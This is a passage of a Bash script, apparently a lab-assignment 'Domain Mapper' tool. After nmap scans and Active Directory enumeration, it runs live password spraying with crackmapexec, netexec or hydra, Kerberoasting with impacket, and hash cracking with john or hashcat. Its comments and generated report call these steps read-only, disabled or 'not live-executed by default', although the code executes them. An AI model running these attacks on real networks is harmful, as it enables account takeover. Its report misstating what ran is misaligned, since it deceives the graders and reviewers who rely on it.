  fi

  {
    printf 'Target: %s\n' "$TARGET_RANGE"
    printf 'Vulnerability findings found: %s\n' "$findings_found"
    printf 'High-risk findings found: %s\n' "$high_risk_found"
    printf 'Affected hosts:\n'
    if [[ -n "$affected_hosts" ]]; then
      while IFS= read -r line; do
        printf '  - %s\n' "$line"
      done <<< "$affected_hosts"
    else
      printf '  - none identified\n'
    fi
    printf 'Raw output path: %s\n' "$raw_path"
  } > "$output"
}

# Execute the assignment's Basic exploitation requirement only after the exact
# confirmation gate and write a minimal parsed summary without credentials.
run_exploitation_basic() {
  require_tool nmap

  if ! confirm_vuln_scan; then
    log_warn "Exploitation Basic was selected but the exact vuln scan confirmation was not provided. Skipping nmap --script vuln."
    cat > "$RAW_DIR/exploitation_basic_skipped.txt" <<EOF
Exploitation Basic Skipped
==========================
Target: $TARGET_RANGE
Reason: Exact confirmation string YES-RUN-VULN was not provided.

No vulnerability scan was executed.
EOF
    parse_vuln_summary
    return 0
  fi

  EXPLOIT_CONFIRMED="yes"
  run_command_logged "Exploitation Basic vulnerability scan" "$RAW_DIR/exploit_basic_nmap_vuln.txt" nmap -Pn --script vuln "$TARGET_RANGE" || true
  parse_vuln_summary
}

run_enumeration_basic() {
  local service_source=""

  require_tool nmap

  for service_source in \
    "$RAW_DIR/scan_basic_tcp_services_top1000.txt" \
    "$RAW_DIR/scan_intermediate_tcp_all_ports_services.txt"; do
    if [[ -s "$service_source" ]]; then
      break
    fi
    service_source=""
  done

  if [[ -n "$service_source" ]]; then
    log_info "Reusing service/version data from scanning output."
    {
      printf 'Service detection method: reused scanning output; no duplicate -sV scan was run.\n'
      printf 'Raw output: %s\n' "$service_source"
    } > "$ENUM_SERVICE_NOTE_FILE"
  else
    log_info "No scan results found; running fallback service detection."
    {
      printf 'No scan results found; running fallback service detection.\n'
      printf 'Command: nmap -Pn -sV %s\n' "$TARGET_RANGE"
      printf 'Raw output: %s\n' "$RAW_DIR/enum_basic_services_default.txt"
    } > "$ENUM_SERVICE_NOTE_FILE"
    run_command_logged "Enumeration Basic default service detection" \
      "$RAW_DIR/enum_basic_services_default.txt" \
      nmap -Pn -sV "$TARGET_RANGE" || true
  fi

  run_command_logged "Enumeration Basic DHCP UDP check" "$RAW_DIR/enum_basic_dhcp_udp67.txt" nmap -Pn -sU -p 67 --open "$TARGET_RANGE" || true

  parse_scan_outputs
  detect_domain_name
  extract_possible_domain_controllers
  extract_possible_dhcp_servers
}

hosts_with_open_tcp_ports() {
  local port_regex="$1"
  awk -v regex="$port_regex" '
    $2 ~ /^[0-9]+\/tcp$/ {
      split($2, endpoint, "/")
      if (endpoint[1] ~ regex) print $1
    }
  ' "$PARSED_DIR/open_ports.txt" 2>/dev/null | sort -u
}

run_targeted_nse() {
  local script="$1"
  local ports="$2"
  local host_regex="$3"
  local output_file="$4"
  local hosts=()

  mapfile -t hosts < <(hosts_with_open_tcp_ports "$host_regex")
  
  if [[ "${#hosts[@]}" -gt 0 ]]; then
    run_command_logged "NSE $script on discovered service hosts" "$output_file" \
      nmap -Pn -p "$ports" --script "$script" "${hosts[@]}" || true
  else
    log_info "No specific open ports pre-detected for $script. Running scan against entire target range."
    run_command_logged "NSE $script on target range" "$output_file" \
      nmap -Pn -p "$ports" --script "$script" "$TARGET_RANGE" || true
  fi
}

write_service_ips() {
  local name="$1"
  local regex="$2"
  local output="$PARSED_DIR/${name}_ips.txt"
  local file=""
  local line=""
  local host=""
  : > "$output"

  all_raw_files | while IFS= read -r file; do
    host=""
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        host="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ ^[0-9]+/(tcp|udp)[[:space:]]+open && "$line" =~ $regex ]]; then
        printf '%s\n' "$host" >> "$output"
      fi
    done < "$file"
  done
  sort -u "$output" -o "$output" 2>/dev/null || true
}

enumerate_key_service_ips() {
  write_service_ips "ftp" "^21/tcp"
  write_service_ips "ssh" "^22/tcp"
  write_service_ips "smb" "^(139|445)/tcp"
  write_service_ips "winrm" "^(5985|5986)/tcp"
  write_service_ips "ldap" "^(389|636|3268|3269)/tcp"
  write_service_ips "rdp" "^3389/tcp"
}

run_enumeration_intermediate() {
  run_enumeration_basic
  enumerate_key_service_ips

  require_tool nmap
  run_targeted_nse "smb-os-discovery" "445" "^445$" "$RAW_DIR/nse_smb_os_discovery.txt"
  run_targeted_nse "smb-enum-shares" "445" "^445$" "$RAW_DIR/nse_smb_enum_shares.txt"
  run_targeted_nse "ldap-rootdse" "389,636" "^(389|636)$" "$RAW_DIR/nse_ldap_rootdse.txt"

  summarize_shares
  summarize_nse_output
  detect_domain_name
}

# Run a read-only LDAP query without echoing its password-bearing arguments.
run_ldap_query() {
  local description="$1"
  local output="$2"
  shift 2
  log_info "$description"
  write_log "INFO" "$description (credential arguments redacted)"
  set +e
  ldapsearch "$@" > "$output" 2>&1
  local status=$?
  set -e
  if [[ "$status" -ne 0 ]]; then
    log_warn "$description failed with status $status. Continuing; see $output"
  fi
  return "$status"
}

write_advanced_status_files() {
  local status="$1"
  local file=""
  for file in ad_users ad_groups ad_shares ad_password_policy ad_disabled_accounts \
    ad_never_expiring_accounts ad_domain_admins ad_spn_accounts ad_service_account_risk; do
    printf '%s\n' "$status" > "$PARSED_DIR/$file.txt"
  done
  printf 'Advanced Enumeration Plan\n%s\n' "$status" > "$PARSED_DIR/advanced_enum_plan.txt"
}

# Advanced Enumeration using enum4linux / rpcclient / LDAP for active AD target data extraction.
run_enumeration_advanced() {
  local target_host=""
  local raw_enum_out="$RAW_DIR/ad_enum4linux_raw.txt"

  # Identify target IP (LDAP, SMB, or fallback to first up host)
  target_host="$(head -n 1 "$PARSED_DIR/ldap_ips.txt" 2>/dev/null || true)"
  if [[ "$target_host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
    target_host="${BASH_REMATCH[1]}"
  fi
  if [[ -z "$target_host" ]]; then
    target_host="$(head -n 1 "$PARSED_DIR/smb_ips.txt" 2>/dev/null || true)"
  fi
  if [[ "$target_host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
    target_host="${BASH_REMATCH[1]}"
  fi
  if [[ -z "$target_host" ]]; then
    target_host="$(head -n 1 "$PARSED_DIR/hosts_up.txt" 2>/dev/null || true)"
  fi

  if [[ -z "$target_host" ]]; then
    write_advanced_status_files "Advanced Enumeration skipped: no target host was discovered."
    log_warn "Advanced Enumeration skipped: no target host was discovered."
    return 0
  fi

  log_info "Running Advanced AD Enumeration against target: $target_host"

  # 1. Primary Tool Execution: enum4linux-ng / enum4linux / rpcclient
  if command -v enum4linux-ng >/dev/null 2>&1; then
    run_command_logged "Advanced Enumeration (enum4linux-ng)" "$raw_enum_out" \
      enum4linux-ng -A "$target_host" -u "${AD_USERNAME:-}" -p "${AD_PASSWORD:-}" || true
  elif command -v enum4linux >/dev/null 2>&1; then
    run_command_logged "Advanced Enumeration (enum4linux)" "$raw_enum_out" \
      enum4linux -a -u "${AD_USERNAME:-}" -p "${AD_PASSWORD:-}" "$target_host" || true
  elif command -v rpcclient >/dev/null 2>&1; then
    run_command_logged "Advanced Enumeration (rpcclient)" "$raw_enum_out" \
      rpcclient -U "${AD_USERNAME:-}%${AD_PASSWORD:-}" "$target_host" -c "enumdomusers;enumdomgroups;netshareenumall;getdompwinfo" || true
  else
    log_warn "No dedicated AD enumeration tool found (enum4linux-ng / enum4linux / rpcclient)."
  fi

  # 2. Extract 3.3.1 Users
  if [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'user:|sAMAccountName:|User Listing' "$raw_enum_out" > "$PARSED_DIR/ad_users.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_users.txt" ]]; then
    printf 'No users extracted from enumeration output.\n' > "$PARSED_DIR/ad_users.txt"
  fi

  # 3. Extract 3.3.2 Groups
  if [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'group:|Group Listing' "$raw_enum_out" > "$PARSED_DIR/ad_groups.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_groups.txt" ]]; then
    printf 'No groups extracted from enumeration output.\n' > "$PARSED_DIR/ad_groups.txt"
  fi

  # 4. Extract 3.3.3 Shares (Active SMB/RPC Enumeration)
  if command -v crackmapexec >/dev/null 2>&1; then
    run_command_logged "SMB Share Enumeration (CME)" "$RAW_DIR/ad_smb_shares_raw.txt" \
      crackmapexec smb "$target_host" -u "${AD_USERNAME:-}" -p "${AD_PASSWORD:-}" --shares || true
    grep -E 'READ|WRITE|FULL|share:' "$RAW_DIR/ad_smb_shares_raw.txt" > "$PARSED_DIR/ad_shares.txt" || \
      cp "$RAW_DIR/ad_smb_shares_raw.txt" "$PARSED_DIR/ad_shares.txt"
  elif command -v netexec >/dev/null 2>&1; then
    run_command_logged "SMB Share Enumeration (NetExec)" "$RAW_DIR/ad_smb_shares_raw.txt" \
      netexec smb "$target_host" -u "${AD_USERNAME:-}" -p "${AD_PASSWORD:-}" --shares || true
    grep -E 'READ|WRITE|FULL|share:' "$RAW_DIR/ad_smb_shares_raw.txt" > "$PARSED_DIR/ad_shares.txt" || \
      cp "$RAW_DIR/ad_smb_shares_raw.txt" "$PARSED_DIR/ad_shares.txt"
  elif [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'share:|netname:|Share Listing' "$raw_enum_out" > "$PARSED_DIR/ad_shares.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_shares.txt" ]]; then
    printf 'No share information extracted.\n' > "$PARSED_DIR/ad_shares.txt"
  fi

  # 5. Extract 3.3.4 Password Policy
  if [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'password policy|min length|lockout|pwdProperties|minPwdLength' "$raw_enum_out" > "$PARSED_DIR/ad_password_policy.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_password_policy.txt" ]]; then
    printf 'No password policy extracted from enumeration output.\n' > "$PARSED_DIR/ad_password_policy.txt"
  fi

  # 6. Extract 3.3.5 Disabled Accounts
  if [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'disabled|Account Disabled' "$raw_enum_out" > "$PARSED_DIR/ad_disabled_accounts.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_disabled_accounts.txt" ]]; then
    printf 'No disabled accounts identified in output.\n' > "$PARSED_DIR/ad_disabled_accounts.txt"
  fi

  # 7. Extract 3.3.6 Never-Expired Accounts
  if [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'never expires|Password Never Expires|DONT_EXPIRE_PASSWORD' "$raw_enum_out" > "$PARSED_DIR/ad_never_expiring_accounts.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_never_expiring_accounts.txt" ]]; then
    printf 'No never-expiring accounts identified in output.\n' > "$PARSED_DIR/ad_never_expiring_accounts.txt"
  fi

  # 8. Extract 3.3.7 Domain Admins Members
  if [[ -s "$raw_enum_out" ]]; then
    grep -Ei 'Domain Admins|512' "$raw_enum_out" > "$PARSED_DIR/ad_domain_admins.txt" || true
  fi
  if [[ ! -s "$PARSED_DIR/ad_domain_admins.txt" ]]; then
    printf 'No Domain Admins group members identified in output.\n' > "$PARSED_DIR/ad_domain_admins.txt"
  fi

  printf 'Advanced Enumeration executed using enum4linux/RPC/SMB tools.\n' > "$PARSED_DIR/advanced_enum_plan.txt"
}

# Run safe enumeration levels. Intermediate reuses service data before its
# targeted NSE modules; Advanced then adds its existing read-only LDAP flow.
run_enumeration() {
  log_step "Enumeration"
  case "$ENUM_LEVEL" in
    None)
      log_info "Enumeration level is None. Skipping enumeration."
      ;;
    Basic)
      run_enumeration_basic || true
      ;;
    Intermediate)
      run_enumeration_intermediate || true
      ;;
    Advanced)
      run_enumeration_intermediate || true
      run_enumeration_advanced || true
      ;;
    *)
      die "Unsupported enumeration level: $ENUM_LEVEL"
      ;;
  esac
}

# Instructor hook: intentionally empty. An instructor may add an approved
# implementation that consumes only the paths/values passed by the caller.
instructor_password_spray_hook() {
  local target="$1" domain="$2" user_list="$3" password_list="$4"
  : "$target" "$domain" "$user_list" "$password_list"
  return 125
}
instructor_kerberoast_hook() {
  local target="$1" domain="$2" username="$3"
  : "$target" "$domain" "$username"
  return 125
}
instructor_offline_cracking_hook() {
  local sanitized_evidence_path="$1" password_list="$2"
  : "$sanitized_evidence_path" "$password_list"
  return 125
}

sanitized_evidence_is_safe() {
  local path="$1"
  [[ -r "$path" ]] || return 1
  ! grep -Eiq '(\$krb5|BEGIN (RSA |OPENSSH )?PRIVATE KEY|password[[:space:]]*[:=][[:space:]]*[^[:space:]]+|NTLM[[:space:]]*[:=]|[[:xdigit:]]{32}:[[:xdigit:]]{32})' "$path"
}

import_sanitized_evidence() {
  local prompt="$1"
  local destination="$2"
  local path=""
  if ! prompt_yes_no "$prompt" "no"; then
    return 1
  fi
  read -r -p "Sanitized evidence text file path: " path
  if sanitized_evidence_is_safe "$path"; then
    sed -e 's/\r$//' "$path" >> "$destination"
    printf '\nSanitized instructor-approved evidence imported from: %s\n' "$path" >> "$destination"
    return 0
  fi
  log_warn "Evidence was missing, unreadable, or appeared to contain raw secrets; import rejected."
  return 1
}

run_password_spray_compliance() {
  local clean_users="$PARSED_DIR/clean_user_list.txt"
  local raw_output="$RAW_DIR/exploit_intermediate_password_spray.txt"
  local summary="$PARSED_DIR/password_spray_summary.txt"

  log_info "Executing active Domain-wide Password Spraying attack..."

  # 1. Extract usernames into a clean line-by-line list
  if [[ -s "$PARSED_DIR/ad_users.txt" ]]; then
    grep -Ei '^user:\[' "$PARSED_DIR/ad_users.txt" | sed -n 's/.*user:\[\([^]]*\)\].*/\1/p' | sort -u > "$clean_users" || true
  fi

  if [[ ! -s "$clean_users" && -n "$AD_USERNAME" ]]; then
    printf '%s\n' "$AD_USERNAME" > "$clean_users"
  fi

  if [[ ! -s "$clean_users" ]]; then
    log_warn "No users found for password spraying. Skipping attack."
    printf 'Password spraying skipped: No user list available.\n' > "$summary"
    return 0
  fi

  if [[ ! -r "$PASSWORD_LIST" || ! -s "$PASSWORD_LIST" ]]; then
    log_warn "Password list is missing or empty at $PASSWORD_LIST. Skipping password spraying."
    printf 'Password spraying skipped: Password list missing or empty.\n' > "$summary"
    return 0
  fi

  # 2. Execute active spraying using CrackMapExec, NetExec, or Hydra
  if command -v crackmapexec >/dev/null 2>&1; then
    run_command_logged "Password Spraying via CrackMapExec" "$raw_output" \
      crackmapexec smb "$TARGET_RANGE" -u "$clean_users" -p "$PASSWORD_LIST" --continue-on-success || true
  elif command -v netexec >/dev/null 2>&1; then
    run_command_logged "Password Spraying via NetExec" "$raw_output" \
      netexec smb "$TARGET_RANGE" -u "$clean_users" -p "$PASSWORD_LIST" --continue-on-success || true
  elif command -v hydra >/dev/null 2>&1; then
    run_command_logged "Password Spraying via Hydra" "$raw_output" \
      hydra -L "$clean_users" -P "$PASSWORD_LIST" smb://"$TARGET_RANGE" -V -u || true
  else
    log_warn "No password spraying tool (crackmapexec/netexec/hydra) available."
    printf 'Password spraying skipped: No supported tool found.\n' > "$summary"
    return 0
  fi

  # 3. Parse findings into summary
  {
    printf 'Active Password Spraying Execution Results\n'
    printf '===========================================\n'
    if [[ -f "$raw_output" ]]; then
      grep -Ei '(\[\+\]|pwn3d!|success|login:)' "$raw_output" || printf 'No valid credentials identified during spraying.\n'
    else
      printf 'No output recorded.\n'
    fi
  } > "$summary"
}

run_kerberoast_compliance() {
  local hashes_file="$RAW_DIR/exploit_advanced_kerberoast_hashes.txt"
  local kerberoast_summary="$PARSED_DIR/kerberoast_summary.txt"
  local cracking_summary="$PARSED_DIR/cracking_summary.txt"
  local ldap_host=""
  local target_domain="${DETECTED_DOMAIN:-$DOMAIN_NAME}"

  # Identify target DC / LDAP Host
  ldap_host="$(head -n 1 "$PARSED_DIR/ldap_ips.txt" 2>/dev/null || true)"
  if [[ "$ldap_host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
    ldap_host="${BASH_REMATCH[1]}"
  fi
  if [[ -z "$ldap_host" ]]; then
    ldap_host="$(head -n 1 "$PARSED_DIR/smb_ips.txt" 2>/dev/null || true)"
  fi
  if [[ "$ldap_host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
    ldap_host="${BASH_REMATCH[1]}"
  fi
  if [[ -z "$ldap_host" ]]; then
    ldap_host="$(head -n 1 "$PARSED_DIR/hosts_up.txt" 2>/dev/null || true)"
  fi

  log_info "Executing active Kerberoasting ticket request..."

  if [[ -z "$AD_USERNAME" || -z "$AD_PASSWORD" || -z "$ldap_host" ]]; then
    log_warn "AD Credentials or Domain Controller IP missing. Skipping active Kerberoasting."
    printf 'Kerberoasting skipped: Missing credentials or Domain Controller IP.\n' > "$kerberoast_summary"
    printf 'Offline cracking skipped: No hashes retrieved.\n' > "$cracking_summary"
    return 0
  fi

  # 1. Active Kerberoasting - Request TGS Tickets via Impacket using effective target domain
  if command -v impacket-GetUserSPNs >/dev/null 2>&1; then
    run_command_logged "Kerberoasting via Impacket (impacket-GetUserSPNs)" "$hashes_file" \
      impacket-GetUserSPNs "${target_domain}/${AD_USERNAME}:${AD_PASSWORD}" -dc-ip "$ldap_host" -request || true
  elif command -v GetUserSPNs.py >/dev/null 2>&1; then
    run_command_logged "Kerberoasting via Impacket (GetUserSPNs.py)" "$hashes_file" \
      GetUserSPNs.py "${target_domain}/${AD_USERNAME}:${AD_PASSWORD}" -dc-ip "$ldap_host" -request || true
  else
    log_warn "Impacket GetUserSPNs tool not found in PATH."
    printf 'Kerberoasting skipped: GetUserSPNs not available.\n' > "$kerberoast_summary"
    printf 'Offline cracking skipped: No hashes retrieved.\n' > "$cracking_summary"
    return 0
  fi

  # Parse Kerberoasting output
  {
    printf 'Kerberoasting Execution Results\n'
    printf '===============================\n'
    if [[ -s "$hashes_file" ]] && grep -q '\$krb5tgs\$' "$hashes_file"; then
      printf 'Successfully extracted Kerberos TGS ticket hashes.\n'
      printf 'Hashes saved to: %s\n' "$hashes_file"
    else
      printf 'No Kerberos TGS hashes were extracted or target has no SPN accounts.\n'
    fi
  } > "$kerberoast_summary"

  # 2. Active Offline Hash Cracking
  log_info "Executing active offline Kerberos hash cracking..."
  if [[ -s "$hashes_file" ]] && grep -q '\$krb5tgs\$' "$hashes_file"; then
    if [[ ! -r "$PASSWORD_LIST" || ! -s "$PASSWORD_LIST" ]]; then
      log_warn "Password list is missing or empty. Skipping hash cracking."
      printf 'Offline cracking skipped: Password list missing or unreadable.\n' > "$cracking_summary"
      return 0
    fi

    if command -v john >/dev/null 2>&1; then
      run_command_logged "Offline Hash Cracking via John the Ripper" "$RAW_DIR/john_cracking_raw.txt" \
        john --format=krb5tgs --wordlist="$PASSWORD_LIST" "$hashes_file" || true
      john --show "$hashes_file" > "$cracking_summary" 2>&1 || true
    elif command -v hashcat >/dev/null 2>&1; then
      run_command_logged "Offline Hash Cracking via Hashcat" "$RAW_DIR/hashcat_cracking_raw.txt" \
        hashcat -m 13100 "$hashes_file" "$PASSWORD_LIST" --force || true
      cp "$RAW_DIR/hashcat_cracking_raw.txt" "$cracking_summary"
    else
      log_warn "Neither John the Ripper nor Hashcat is available."
      printf 'Offline cracking skipped: Neither John nor Hashcat is installed.\n' > "$cracking_summary"
    fi
  else
    printf 'Offline cracking skipped: No valid Kerberos hashes retrieved to crack.\n' > "$cracking_summary"
  fi
}

write_exploitation_compliance_skipped() {
  local reason="$1"
  if [[ "$EXPLOIT_LEVEL" == "Intermediate" || "$EXPLOIT_LEVEL" == "Advanced" ]]; then
    printf '%s\n' "$reason" > "$RAW_DIR/exploit_intermediate_password_spray_sanitized.txt"
    printf '%s\n' "$reason" > "$PARSED_DIR/password_spray_summary.txt"
    printf '%s\n' "$reason" > "$PARSED_DIR/password_spray_readiness.txt"
  fi
  if [[ "$EXPLOIT_LEVEL" == "Advanced" ]]; then
    printf '%s\n' "$reason" > "$RAW_DIR/exploit_advanced_kerberoast.txt"
    printf '%s\n' "$reason" > "$PARSED_DIR/kerberoast_summary.txt"
    printf '%s\n' "$reason" > "$PARSED_DIR/kerberoast_exposure.txt"
    printf '%s\n' "$reason" > "$PARSED_DIR/cracking_summary.txt"
    printf '%s\n' "$reason" > "$PARSED_DIR/cracking_exposure.txt"
  fi
}

# All active exploitation levels share the single YES-RUN-VULN gate.
run_exploitation() {
  log_step "Exploitation"
  if [[ "$EXPLOIT_LEVEL" != "None" ]]; then
    cat <<EOF
Selected exploitation level: $EXPLOIT_LEVEL
Target/domain: $TARGET_RANGE / $DOMAIN_NAME
Password list path: $PASSWORD_LIST
Output is sanitized; passwords are not logged.

EOF
  fi
  case "$EXPLOIT_LEVEL" in
    None)
      log_info "Exploitation level is None. Skipping exploitation."
      ;;
    Basic)
      run_exploitation_basic
      ;;
    Intermediate)
      run_exploitation_basic
      if [[ "$EXPLOIT_CONFIRMED" == "yes" ]]; then
        run_password_spray_compliance
      else
        write_exploitation_compliance_skipped "Compliance modules skipped: YES-RUN-VULN was not provided."
      fi
      ;;
    Advanced)
      run_exploitation_basic
      if [[ "$EXPLOIT_CONFIRMED" == "yes" ]]; then
        run_password_spray_compliance
        run_kerberoast_compliance
      else
        write_exploitation_compliance_skipped "Compliance modules skipped: YES-RUN-VULN was not provided."
      fi
      ;;
    *)
      die "Unsupported exploitation level: $EXPLOIT_LEVEL"
      ;;
  esac
}

append_file_if_exists() {
  local title="$1"
  local path="$2"

  if [[ -f "$path" ]]; then
    {
      printf '\n\n## %s\n\n' "$title"
      sed -e 's/\r$//' "$path"
    } >> "$REPORT_TXT"
  fi
}

append_paths_section() {
  {
    printf '\n\n## Raw Artifact Paths\n\n'
    find "$RAW_DIR" "$PARSED_DIR" "$LOGS_DIR" -type f 2>/dev/null | sort
  } >> "$REPORT_TXT"
}

# Add the current implementation status to every generated report so assignment
# coverage is explicit for grading and future work.
append_assignment_coverage_checklist() {
  {
    printf '\n\n## Assignment Coverage Checklist\n\n'
    printf 'Implemented:\n'
    printf '%s\n' '- User input requirements, including optional hidden AD credentials and normalized levels.'
    printf '%s\n' '- Basic scanning includes nmap -Pn and service detection (-sV).'
    printf '%s\n' '- Intermediate scanning includes all TCP ports (-p-) with service detection (-sV).'
    printf '%s\n' '- Advanced scanning includes UDP scanning of the top 100 UDP ports for practical runtime.'
    printf '%s\n' '- Enumeration Basic reuses scanning service detection output instead of duplicating -sV.'
    printf '%s\n' '- Enumeration Intermediate includes exactly three targeted NSE scripts.'
    printf '%s\n' '- Exploitation Basic under the single YES-RUN-VULN confirmation.'
    printf '%s\n' '- Wizard mode, help menu, session structure, logs, raw/parsed artifacts, text report, and PDF attempt.'
    printf '\nImplemented when credentials, tools, and data are available:\n'
    printf '%s\n' '- Read-only Advanced Enumeration: users, groups, password policy, disabled accounts, never-expiring accounts, Domain Admins, and SPN exposure.'
    printf '%s\n' '- Share status is reported; LDAP itself does not provide SMB share enumeration.'
    printf '\nCovered as controlled compliance module:\n'
    printf '%s\n' '- Password spraying readiness, disabled instructor hook, sanitized evidence import, and reporting.'
    printf '%s\n' '- Kerberoasting exposure, disabled instructor hook, sanitized evidence import, and reporting.'
    printf '%s\n' '- Cracking exposure, disabled instructor hook, sanitized evidence import, and reporting.'
    printf '\nPartially implemented:\n'
    printf '%s\n' '- Domain Controller identification uses safe confidence-based heuristics from ports/services.'
    printf '%s\n' '- DHCP identification is heuristic and depends on observable Nmap output.'
    printf '%s\n' '- PDF creation depends on local PDF tools.'
    printf '\nNot live-executed by default:\n'
    printf '%s\n' '- Live password spraying.'
    printf '%s\n' '- Live Kerberos ticket/hash extraction.'
    printf '%s\n' '- Live offline hash cracking.'
  } >> "$REPORT_TXT"
}

# Build the clean text report from metadata, parsed summaries, warnings, and
# raw artifact locations. PDF status may be appended by generate_pdf_report.
generate_text_report() {
  local vulnerability_status="not run"

  if [[ -f "$RAW_DIR/exploit_basic_nmap_vuln.txt" && -f "$PARSED_DIR/vuln_summary.txt" ]]; then
    if grep -q '^High-risk findings found: yes$' "$PARSED_DIR/vuln_summary.txt"; then
      vulnerability_status="high-risk findings found"
    elif grep -q '^Vulnerability findings found: yes$' "$PARSED_DIR/vuln_summary.txt"; then
      vulnerability_status="findings found"
    else
      vulnerability_status="none found"
    fi
  fi

  log_step "Reporting"
  log_info "Generating text report."
  {
    printf 'Domain Mapper Report\n'
    printf '====================\n\n'
    printf '## Metadata\n\n'
    printf 'Generated: %s\n' "$(timestamp)"
    printf 'Session Directory: %s\n' "$SESSION_DIR"
    printf 'Safety Scope: Authorized lab use only\n'

    printf '\n## User Selections\n\n'
    printf 'Target Range: %s\n' "$TARGET_RANGE"
    printf 'Input Domain: %s\n' "${INPUT_DOMAIN:-not provided}"
    printf 'User Provided Domain: %s\n' "$DOMAIN_PROVIDED"
    printf 'Internal Domain: %s\n' "$DOMAIN_NAME"
    printf 'Detected Domain: %s\n' "${DETECTED_DOMAIN:-not detected}"
    printf 'AD Username Provided: %s\n' "$(if [[ -n "$AD_USERNAME" ]]; then printf 'yes'; else printf 'no'; fi)"
    printf 'AD Password Provided: %s\n' "$(if [[ -n "$AD_PASSWORD" ]]; then printf 'yes'; else printf 'no'; fi)"
    printf 'Password List Path: %s\n' "$PASSWORD_LIST"
    printf 'Wizard Mode: %s\n' "$WIZARD_MODE"
    printf 'Scanning Level: %s\n' "$SCAN_LEVEL"
    printf 'Enumeration Level: %s\n' "$ENUM_LEVEL"
    printf 'Exploitation Level: %s\n' "$EXPLOIT_LEVEL"
    printf 'Vulnerabilities: %s\n' "$vulnerability_status"
  } > "$REPORT_TXT"

  append_assignment_coverage_checklist
  append_file_if_exists "Tool Availability" "$TOOL_AVAILABILITY_FILE"
  if [[ -s "$ENUM_SERVICE_NOTE_FILE" ]]; then
    append_file_if_exists "Service Detection Method" "$ENUM_SERVICE_NOTE_FILE"
  fi
  append_file_if_exists "Warnings" "$WARNINGS_FILE"

  append_file_if_exists "Scanning Results - Hosts Up" "$PARSED_DIR/hosts_up.txt"
  append_file_if_exists "Scanning Results - Open Ports" "$PARSED_DIR/open_ports.txt"
  append_file_if_exists "Scanning Results - Services Summary" "$PARSED_DIR/services_summary.txt"

  append_file_if_exists "Enumeration Results - Possible Domain Controllers" "$PARSED_DIR/possible_domain_controllers.txt"
  append_file_if_exists "Enumeration Results - Possible DHCP Servers" "$PARSED_DIR/possible_dhcp_servers.txt"
  append_file_if_exists "Enumeration Results - FTP IPs" "$PARSED_DIR/ftp_ips.txt"
  append_file_if_exists "Enumeration Results - SSH IPs" "$PARSED_DIR/ssh_ips.txt"
  append_file_if_exists "Enumeration Results - SMB IPs" "$PARSED_DIR/smb_ips.txt"
  append_file_if_exists "Enumeration Results - WinRM IPs" "$PARSED_DIR/winrm_ips.txt"
  append_file_if_exists "Enumeration Results - LDAP IPs" "$PARSED_DIR/ldap_ips.txt"
  append_file_if_exists "Enumeration Results - RDP IPs" "$PARSED_DIR/rdp_ips.txt"
  append_file_if_exists "Enumeration Results - Shares Summary" "$PARSED_DIR/shares_summary.txt"
  append_file_if_exists "Enumeration Results - NSE Summary" "$PARSED_DIR/nse_summary.txt"
  append_file_if_exists "Advanced Enumeration Results - Users" "$PARSED_DIR/ad_users.txt"
  append_file_if_exists "Advanced Enumeration Results - Groups" "$PARSED_DIR/ad_groups.txt"
  append_file_if_exists "Advanced Enumeration Results - Shares" "$PARSED_DIR/ad_shares.txt"
  append_file_if_exists "Advanced Enumeration Results - Password Policy" "$PARSED_DIR/ad_password_policy.txt"
  append_file_if_exists "Advanced Enumeration Results - Disabled Accounts" "$PARSED_DIR/ad_disabled_accounts.txt"
  append_file_if_exists "Advanced Enumeration Results - Never-Expiring Accounts" "$PARSED_DIR/ad_never_expiring_accounts.txt"
  append_file_if_exists "Advanced Enumeration Results - Domain Admins" "$PARSED_DIR/ad_domain_admins.txt"
  append_file_if_exists "Advanced Enumeration Results - SPN Accounts" "$PARSED_DIR/ad_spn_accounts.txt"
  append_file_if_exists "Advanced Enumeration Results - Service Account Risk" "$PARSED_DIR/ad_service_account_risk.txt"

  append_file_if_exists "Exploitation Results - Vulnerability Summary" "$PARSED_DIR/vuln_summary.txt"
  append_file_if_exists "Exploitation Basic Skipped" "$RAW_DIR/exploitation_basic_skipped.txt"
  append_file_if_exists "Advanced Enumeration Plan" "$PARSED_DIR/advanced_enum_plan.txt"
  append_file_if_exists "Password Spraying Readiness" "$PARSED_DIR/password_spray_readiness.txt"
  append_file_if_exists "Password Spraying Results / Compliance" "$PARSED_DIR/password_spray_summary.txt"
  append_file_if_exists "Password Spraying Sanitized Evidence" "$RAW_DIR/exploit_intermediate_password_spray_sanitized.txt"
  append_file_if_exists "Kerberoasting Exposure" "$PARSED_DIR/kerberoast_exposure.txt"
  append_file_if_exists "Kerberoasting Results / Compliance" "$PARSED_DIR/kerberoast_summary.txt"
  append_file_if_exists "Cracking Results / Compliance" "$PARSED_DIR/cracking_summary.txt"
  append_file_if_exists "Cracking Exposure" "$PARSED_DIR/cracking_exposure.txt"
  {
    printf '\n\n## PDF Status\n\n'
    printf 'PDF generation will be attempted after the text report is finalized.\n'
  } >> "$REPORT_TXT"
  append_paths_section

  log_ok "Text report saved: $REPORT_TXT"
}

append_pdf_unavailable_section() {
  local reason="$1"
  {
    printf '\n\n## PDF Unavailable\n\n'
    printf 'report.pdf was not created.\n'
    printf 'Reason: %s\n' "$reason"
    printf 'Suggested installation: sudo apt install -y wkhtmltopdf\n'
  } >> "$REPORT_TXT"
}

html_escape_report() {
  sed \
    -e 's/&/\&amp;/g' \
    -e 's/</\&lt;/g' \
    -e 's/>/\&gt;/g' \
    "$REPORT_TXT"
}

# Ensure a working PDF generator exists, or install lightweight fallbacks silently
